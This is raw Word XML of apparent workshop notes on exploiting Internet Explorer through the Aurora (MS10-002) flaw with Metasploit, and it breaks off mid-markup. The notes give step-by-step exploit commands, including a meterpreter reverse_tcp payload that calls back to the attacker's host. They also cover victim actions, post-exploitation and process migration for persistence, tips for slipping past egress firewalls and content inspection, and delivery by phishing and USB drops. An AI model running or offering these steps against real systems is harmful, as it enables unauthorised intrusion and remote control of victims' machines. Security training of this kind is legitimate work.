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BC1" w:rsidRDefault="00C70EC9">
      <w:pPr>
        <w:pStyle w:val="Title"/>
      </w:pPr>
      <w:r>
        <w:t>Workshop Notes: Browser Exploitation using Aurora Vulnerability</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00013BC1" w:rsidRDefault="00C70EC9">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>Objective</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00013BC1" w:rsidRDefault="00C70EC9">
      <w:r>
        <w:t xml:space="preserve">To understand and demonstrate how a client-side browser exploit can be used to gain control over a vulnerable system using Metasploit and the MS10-002 Aurora vulnerability in </w:t>
      </w:r>
      <w:r>
        <w:t>Internet Explorer.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00013BC1" w:rsidRDefault="00C70EC9">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>Prerequisites</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00013BC1" w:rsidRDefault="00C70EC9">
      <w:r>
        <w:t>- Kali Linux with Metasploit Framework installed</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00013BC1" w:rsidRDefault="00C70EC9">
      <w:r>
        <w:t>- Windows XP with Internet Explorer 6 or 7 (unpatched)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00013BC1" w:rsidRDefault="00C70EC9">
      <w:r>
        <w:t>- Both machines on the same subnet and able to communicate (check with ping)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00013BC1" w:rsidRDefault="00C70EC9">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>Step-by-Step Instructions</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00013BC1" w:rsidRDefault="00C70EC9">
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>1. Start Metaspl</w:t>
      </w:r>
      <w:r>
        <w:t>oit:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00013BC1" w:rsidRDefault="00C70EC9">
      <w:pPr>
        <w:pStyle w:val="IntenseQuote"/>
      </w:pPr>
      <w:r>
        <w:t>msfconsole</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00013BC1" w:rsidRDefault="00C70EC9">
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>2. Load the Aurora exploit module:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00013BC1" w:rsidRDefault="00C70EC9">
      <w:pPr>
        <w:pStyle w:val="IntenseQuote"/>
      </w:pPr>
      <w:r>
        <w:t>use exploit/windows/browser/ms10_002_aurora</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00013BC1" w:rsidRDefault="00C70EC9">
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>3. Set required options:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00013BC1" w:rsidRDefault="00C70EC9">
      <w:pPr>
        <w:pStyle w:val="IntenseQuote"/>
      </w:pPr>
      <w:r>
        <w:t>set SRVHOST &lt;Your Kali IP&gt;</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>set SRVPORT 8080</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>set URIPATH /</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>set PAYLOAD windows/meterpreter/reverse_tcp</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>set LHOST &lt;Your Kali IP&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00013BC1" w:rsidRDefault="00C70EC9">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Optionall</w:t>
      </w:r>
      <w:r>
        <w:t>y, set AutoRunScript or PrependMigrate:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00013BC1" w:rsidRDefault="00C70EC9">
      <w:pPr>
        <w:pStyle w:val="IntenseQuote"/>
      </w:pPr>
      <w:r>
        <w:t>set AutoRunScript migrate -f</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00013BC1" w:rsidRDefault="00C70EC9">
      <w:pPr>
        <w:pStyle w:val="IntenseQuote"/>
      </w:pPr>
      <w:r>
        <w:t>OR</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00013BC1" w:rsidRDefault="00C70EC9">
      <w:pPr>
        <w:pStyle w:val="IntenseQuote"/>
      </w:pPr>
      <w:r>
        <w:t>set PrependMigrate true</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00013BC1" w:rsidRDefault="00C70EC9">
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>4. Launch the exploit:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00013BC1" w:rsidRDefault="00C70EC9">
      <w:pPr>
        <w:pStyle w:val="IntenseQuote"/>
      </w:pPr>
      <w:r>
        <w:t>exploit</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00013BC1" w:rsidRDefault="00C70EC9">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>Victim Action (on Windows XP)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00013BC1" w:rsidRDefault="00C70EC9">
      <w:r>
        <w:t>1. Open Internet Explorer.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00013BC1" w:rsidRDefault="00C70EC9">
      <w:r>
        <w:t>2. Visit the URL: http://&lt;Kali-IP&gt;:8080/</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00013BC1" w:rsidRDefault="00C70EC9">
      <w:r>
        <w:t>3. Observe a Meterpreter sessio</w:t>
      </w:r>
      <w:r>
        <w:t>n opening in Kali.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00013BC1" w:rsidRDefault="00C70EC9">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>Important Commands During Exploitation</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00013BC1" w:rsidRDefault="00C70EC9">
      <w:pPr>
        <w:pStyle w:val="IntenseQuote"/>
      </w:pPr>
      <w:r>
        <w:t>jobs</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00013BC1" w:rsidRDefault="00C70EC9">
      <w:pPr>
        <w:pStyle w:val="IntenseQuote"/>
      </w:pPr>
      <w:r>
        <w:t>kill &lt;job_id&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00013BC1" w:rsidRDefault="00C70EC9">
      <w:pPr>
        <w:pStyle w:val="IntenseQuote"/>
      </w:pPr>
      <w:r>
        <w:t>sessions</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00013BC1" w:rsidRDefault="00C70EC9">
      <w:pPr>
        <w:pStyle w:val="IntenseQuote"/>
      </w:pPr>
      <w:r>
        <w:t>sessions -i &lt;session_id&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00013BC1" w:rsidRDefault="00C70EC9">
      <w:pPr>
        <w:pStyle w:val="IntenseQuote"/>
      </w:pPr>
      <w:r>
        <w:t>run migrate</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00013BC1" w:rsidRDefault="00C70EC9">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>Post-Exploitation Suggestions</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00013BC1" w:rsidRDefault="00C70EC9">
      <w:r>
        <w:t>After gaining the session, try running the following in Meterpreter:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00013BC1" w:rsidRDefault="00C70EC9">
      <w:pPr>
        <w:pStyle w:val="IntenseQuote"/>
      </w:pPr>
      <w:r>
        <w:t>sysinfo</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>getuid</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>ps</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>migrate &lt;PID&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00013BC1" w:rsidRDefault="00C70EC9">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>Expected Outcome</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00013BC1" w:rsidRDefault="00C70EC9">
      <w:r>
        <w:t>- Understanding of client-side browser exploits</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00013BC1" w:rsidRDefault="00C70EC9">
      <w:r>
        <w:t>- Ability to use Metasploit for such attacks</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00013BC1" w:rsidRDefault="00C70EC9">
      <w:r>
        <w:t>- Learn to maintain session persistence with process migration</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33"/>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33"/>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B33">
      <w:pPr>
        <w:pStyle w:val="Title"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">Browser Exploitation using Aurora </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>Vulnerability</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>:detailed</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> notes</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B33">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Strong"/>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>1. Payload Communication in Filtered Networks</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B33">
      <w:pPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
      </w:pPr>
      <w:r>
        <w:t>In real-world penetration tests, outbound traffic from the target system may be restricted by firewalls or proxies. Some networks allow traffic only through standard service ports:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B3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Commonly allowed ports:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B33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80</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> – HTTP</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B33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443</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> – HTTPS</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B33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Others may be blocked (e.g., </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
        <w:t>4444</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, used by default in </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>Metasploit</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>reverse_tcp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> payloads).</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B33">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Strong"/>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Evasion Techniques:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B3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Change LPORT to an Allowed Port</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>Example:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B33">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>bash</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B33">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>CopyEdit</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B33">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="hljs-builtin"/>
          <w:rFonts w:eastAsiaTheme="majorEastAsia"/>
        </w:rPr>
        <w:t>set</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
        </w:rPr>
        <w:t xml:space="preserve"> LPORT 80</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B3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Use All Ports Payload</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
        <w:t>reverse_tcp_allports</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> payload attempts to connect back to the attack machine on all ports until one succeeds:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B33">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>bash</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B33">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>CopyEdit</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B33">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="hljs-builtin"/>
          <w:rFonts w:eastAsiaTheme="majorEastAsia"/>
        </w:rPr>
        <w:t>set</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
        </w:rPr>
        <w:t xml:space="preserve"> payload windows/shell/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
        </w:rPr>
        <w:t>reverse_tcp_allports</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B33">
      <w:r>
        <w:pict>
          <v:rect id="_x0000_i1025" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B33">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Strong"/>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>2. HTTP and HTTPS Payloads for Bypassing Content Filters</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B33">
      <w:pPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Some advanced filtering systems </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Strong"/>
        </w:rPr>
        <w:t>inspect content</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> to detect non-compliant traffic, even if it’s on an allowed port.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B3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Problem:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
        <w:t>reverse_tcp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> traffic may be blocked if it doesn't match expected protocol behavior.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B33">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Strong"/>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Solution: Use Protocol-Compliant Payloads</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B3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HTTP/HTTPS Reverse Payloads:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B33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Follow the HTTP(S) protocol specification.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B33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Appear as legitimate web traffic.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B33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lastRenderedPageBreak/>
        <w:t>More likely to bypass content inspection systems.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B33">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Strong"/>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Advantages:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B3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Encrypted communication</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (especially HTTPS).</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B3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Packet-based</w:t>
      </w:r>
      <w:r>
        <w:t>, not stream-based:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B33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Resilient to short network outages.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B33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Sessions can </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Strong"/>
        </w:rPr>
        <w:t>reconnect</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> automatically.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B33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9F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B33">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Strong"/>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>3. Client-Side Exploitation</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B33">
      <w:pPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Unlike server-side vulnerabilities, client-side attacks target </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Strong"/>
        </w:rPr>
        <w:t>applications not listening</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> on the network:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B3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Examples:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B33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Web browsers</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B33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PDF/document viewers</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B33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Media players</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B33">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Strong"/>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Key Characteristics:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B3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These applications are still vulnerable to crafted input.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B3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We must </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Strong"/>
        </w:rPr>
        <w:t>entice users</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> to open </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Strong"/>
        </w:rPr>
        <w:t>malicious files</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> or visit </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Strong"/>
        </w:rPr>
        <w:t>exploit-laden websites</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B33">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Strong"/>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Why Important?</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B3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Ideal for attacking internal systems with no open ports.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B3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Even behind NAT or firewalls, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Strong"/>
        </w:rPr>
        <w:t>users initiate outbound connections</w:t>
      </w:r>
      <w:r>
        <w:t>, which we can hijack.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B33">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Strong"/>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Example Techniques:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B3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Malicious PDFs, Office docs, or web pages exploiting known vulnerabilities.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B3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Deliver via:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B33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Phishing emails</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B33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Compromised websites</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B33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USB drops</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B33">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
        </w:rPr>
        <w:t>🔍</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Strong"/>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">Browser Attack – Aurora Exploit (MS10-002) via </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Strong"/>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Metasploit</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B33">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
        </w:rPr>
        <w:t>📌</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Strong"/>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Background</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B3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Aurora Exploit</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Zero-day vulnerability in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Strong"/>
        </w:rPr>
        <w:t>Internet Explorer</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> used in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Strong"/>
        </w:rPr>
        <w:t>2010</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> against </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Strong"/>
        </w:rPr>
        <w:t>Google, Adobe, Yahoo</w:t>
      </w:r>
      <w:r>
        <w:t>, etc.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B3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lastRenderedPageBreak/>
        <w:t xml:space="preserve">Even fully patched browsers at that time were vulnerable if users visited a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Strong"/>
        </w:rPr>
        <w:t>malicious webpage</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B33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t>Metasploit</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> module:</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
        <w:t>exploit/windows/browser/ms10_002_aurora</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B33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9F5B33" w:rsidRDefault="009F5B33" w:rsidP="009F5B33">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
        </w:rPr>
        <w:t>⚙️</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Strong"/>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">Basic Module Setup in </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
